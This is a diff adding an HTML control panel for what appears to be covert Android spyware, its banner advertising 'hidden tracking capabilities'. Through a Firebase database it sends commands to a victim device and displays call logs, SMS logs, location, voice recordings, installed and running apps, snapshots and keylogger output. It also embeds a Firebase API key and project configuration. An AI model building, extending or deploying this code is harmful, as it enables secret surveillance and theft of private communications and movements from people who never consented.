@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home - Django App</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<!-- Firebase v8 SDK -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+    // Firebase configuration (use your actual Firebase config here)
+    const firebaseConfig = {
+        apiKey: "AIzaSyBT8KtCVmeP98tLlIGoE07a4EPoVedEWFM",
+        authDomain: "darkmatter-78480.firebaseapp.com",
+        databaseURL: "https://darkmatter-78480-default-rtdb.firebaseio.com",
+        projectId: "darkmatter-78480",
+        storageBucket: "darkmatter-78480.appspot.com",
+        messagingSenderId: "969084296444",
+        appId: "1:969084296444:web:48fb4175126b112ed70b79"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // Function to get a parameter from the URL
+    function getUrlParameter(name) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(name);
+    }
+
+    // Function to update the command value in Firebase for the specified node
+    function updateFirebaseCommand(nodeId, commandValue) {
+        const commandRef = database.ref('Device/' + nodeId + '/commnd');
+        commandRef.set(commandValue, function(error) {
+            if (error) {
+                console.error('Error updating command:', error);
+            } else {
+                console.log('Command updated successfully.');
+                // After setting the command, fetch and display the corresponding data
+                fetchCommandData(nodeId, commandValue);
+            }
+        });
+    }
+
+    // Function to fetch the data based on the command and display it in the main box
+    function fetchCommandData(nodeId, commandValue) {
+        const dataRef = database.ref('Device/' + nodeId + '/' + commandValue);
+
+        dataRef.once('value', function(snapshot) {
+            const data = snapshot.val();
+
+            // Handle the case when there's no data
+            if (data) {
+                displayData(data);
+            } else {
+                displayData("No data available for " + commandValue);
+            }
+        });
+    }
+
+// Function to display the fetched data inside the main box
+function displayData(data) {
+    const mainBox = document.querySelector('main');
+    mainBox.innerHTML = '';  // Clear previous content
+
+    // If data is an array (e.g., call logs), display each as a separate item
+    if (Array.isArray(data)) {
+        data.forEach(item => {
+            const tableRow = createTableRow(item);
+            mainBox.appendChild(tableRow);
+        });
+    } else {
+        // If it's a single piece of data, display it in a table row
+        const tableRow = createTableRow(data);
+        mainBox.appendChild(tableRow);
+    }
+}
+
+// Helper function to create a table-like row
+function createTableRow(item) {
+    const rowDiv = document.createElement('div');
+    rowDiv.classList.add('grid', 'grid-cols-2', 'gap-4', 'py-3', 'px-4', 'w-full', 'text-lg', 'bg-white', 'border', 'border-gray-300', 'rounded-lg');
+
+    // Loop through the keys and values of the item
+    for (const key in item) {
+        if (item.hasOwnProperty(key)) {
+            // Create the key (column 1)
+            const keyDiv = document.createElement('div');
+            keyDiv.classList.add('font-semibold', 'text-gray-600');
+            keyDiv.textContent = key;  // The key will be the title
+    
+            // Create the value (column 2)
+            const valueDiv = document.createElement('div');
+            valueDiv.classList.add('text-gray-800');
+            valueDiv.textContent = item[key];  // The value will be the description
+    
+            rowDiv.appendChild(keyDiv);
+            rowDiv.appendChild(valueDiv);
+        }
+    }
+
+    return rowDiv;
+}
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const nodeId = getUrlParameter('id');
+        
+        if (nodeId) {
+            const buttons = [
+                { selector: 'button i.fas.fa-phone-alt', command: 'callLogs' },
+                { selector: 'button i.fas.fa-sms', command: 'smsLogs' },
+                { selector: 'button i.fas.fa-location-arrow', command: 'getLocation' },
+                { selector: 'button i.fas.fa-microphone', command: 'voiceRecording' },
+                { selector: 'button i.fas.fa-bolt', command: 'torchOn' },
+                { selector: 'button i.fas.fa-lightbulb', command: 'torchOff' },
+                { selector: 'button i.fas.fa-image', command: 'changeWallpaper' },
+                { selector: 'button i.fas.fa-volume-mute', command: 'unmuteVolume' },
+                { selector: 'button i.fas.fa-cogs', command: 'setVolume' },
+                { selector: 'button i.fas.fa-tasks', command: 'runningApps' },
+                { selector: 'button i.fas.fa-box', command: 'installedApps' }
+            ];
+
+            buttons.forEach(button => {
+                const buttonElement = document.querySelector(button.selector);
+                if (buttonElement) {
+                    buttonElement.closest('button').addEventListener('click', function() {
+                        updateFirebaseCommand(nodeId, button.command);
+                    });
+                }
+            });
+        } else {
+            console.error('Node ID is missing in the URL.');
+        }
+    });
+</script>
+
+<body class="font-sans bg-gray-400 min-h-screen overflow-auto">
+    <nav class="bg-gradient-to-r from-blue-500 to-purple-500 rounded-bl-3xl rounded-br-3xl p-2 shadow-lg sticky top-0 z-50 flex justify-center items-center text-center">
+        <span class="text-white text-lg font-semibold">Conveys hidden tracking capabilities</span>
+    </nav>
+    
+    <div class="flex flex-col lg:flex-row">
+        <div class="w-full lg:w-[200px] text-black p-4 lg:block">
+            <nav class="z-20 flex shrink-0 grow-0 justify-around gap-4 border-t border-gray-200 bg-white p-2.5 shadow-lg backdrop-blur-lg fixed top-2/4 -translate-y-2/4 left-6 min-h-[auto] min-w-[64px] flex-col rounded-lg border">
+                <a href="" class="flex aspect-square min-h-[32px] w-16 flex-col items-center justify-center gap-1 rounded-md p-1.5 bg-blue-400 text-white hover:text-white transition duration-300 transform hover:scale-105 shadow-lg">
+                    <i class="fas fa-user-circle"></i>
+                    <small class="text-center text-xs font-medium">Online</small>
+                </a>
+                <hr />
+                <a href="" class="flex aspect-square min-h-[32px] w-16 flex-col items-center justify-center gap-1 rounded-md p-1.5 text-gray-700 hover:bg-gray-300 transition duration-300 transform hover:scale-105 shadow-lg">
+                    <i class="fas fa-battery-half"></i>
+                    <small class="text-center text-xs font-medium">Battery</small>
+                </a>
+                <hr />
+                <a href="" class="flex aspect-square min-h-[32px] w-16 flex-col items-center justify-center gap-1 rounded-md p-1.5 text-gray-700 hover:bg-gray-300 transition duration-300 transform hover:scale-105 shadow-lg">
+                    <i class="fas fa-wifi"></i>
+                    <small class="text-center text-xs font-medium">Wifi</small>
+                </a>
+                <hr />
+                <a href="" class="flex aspect-square min-h-[32px] w-16 flex-col items-center justify-center gap-1 rounded-md p-1.5 text-gray-700 hover:bg-gray-300 transition duration-300 transform hover:scale-105 shadow-lg">
+                    <i class="fas fa-wave-square"></i>
+                    <small class="text-center text-xs font-medium">Vibrate</small>
+                </a>
+            </nav>
+        </div>
+
+        <!-- Main Content Area -->
+        <div class="flex-1 p-6 flex flex-col">
+            <main class="mt-5 w-full text-black bg-white rounded-xl border-t border-gray-200 p-2.5 shadow-lg backdrop-blur-lg px-5 py-10 overflow-auto max-h-[430px]">
+                <!-- Data will be displayed here -->
+            </main>
+
+
+            <section class="mt-5 text-black bg-white rounded-xl border-t border-gray-200 p-2.5 shadow-lg backdrop-blur-lg px-5 py-5">
+                <div class="grid grid-cols-4 gap-4">
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-phone-alt mr-2"></i>Call Logs
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-sms mr-2"></i>SMS Logs
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-location-arrow mr-2"></i>Get Location
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-microphone mr-2"></i>Voice Recording
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-bolt"></i>Torch On
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-lightbulb mr-2"></i>Torch Off
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-image mr-2"></i>Change Wallpaper
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-volume-mute mr-2"></i>Unmute Volume
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-cogs mr-2"></i>Set Volume
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-tasks mr-2"></i>Running Apps
+                    </button>
+                
+                    <button class="text-white text-sm font-semibold py-2 px-4 rounded-lg bg-blue-400 hover:bg-gradient-to-r hover:from-blue-400 hover:to-purple-400 transition duration-300 transform hover:scale-105 shadow-lg">
+                        <i class="fas fa-box mr-2"></i>Installed Apps
+                    </button>
+                </div>
+            </section>
+            
+          
+            
+            
+        
+            
+        </div>
+
+        <!-- Right Sidebar -->
+        <div class="w-full lg:w-[200px] text-black p-4 lg:block">
+            <nav class="z-20 flex shrink-0 grow-0 justify-around gap-4 border-t border-gray-200 bg-white p-2.5 shadow-lg backdrop-blur-lg fixed top-2/4 -translate-y-2/4 right-6 min-h-[auto] min-w-[64px] flex-col rounded-lg border">
+                <a href="" class="flex aspect-square min-h-[32px] w-16 flex-col items-center justify-center gap-1 rounded-md p-1.5 bg-blue-400 text-white hover:text-white transition duration-300 transform hover:scale-105 shadow-lg">
+                    <i class="fas fa-camera"></i>
+                    <small class="text-center text-xs font-medium">Snap Shot</small>
+                </a>
+                <hr />
+                <a href="" class="flex aspect-square min-h-[32px] w-16 flex-col items-center justify-center gap-1 rounded-md p-1.5 text-gray-700 hover:bg-gray-300 transition duration-300 transform hover:scale-105 shadow-lg">
+                    <i class="fas fa-mobile-alt"></i>
+                    <small class="text-center text-xs font-medium">Info</small>
+                </a>
+                <hr />
+                <a href="" class="flex aspect-square min-h-[32px] w-16 flex-col items-center justify-center gap-1 rounded-md p-1.5 text-gray-700 hover:bg-gray-300 transition duration-300 transform hover:scale-105 shadow-lg">
+                    <i class="fas fa-volume-mute"></i>
+                    <small class="text-center text-xs font-medium">Mute</small>
+                </a>
+                <hr />
+                <a href="" class="flex aspect-square min-h-[32px] w-16 flex-col items-center justify-center gap-1 rounded-md p-1.5 text-gray-700 hover:bg-gray-300 transition duration-300 transform hover:scale-105 shadow-lg">
+                    <i class="fas fa-clipboard"></i>
+                    <small class="text-xs font-medium">Keylogger</small>
+                </a>
+            </nav>
+            
+        </div>
+    </div>
+
+  
+    
+
+</body>
+</html>
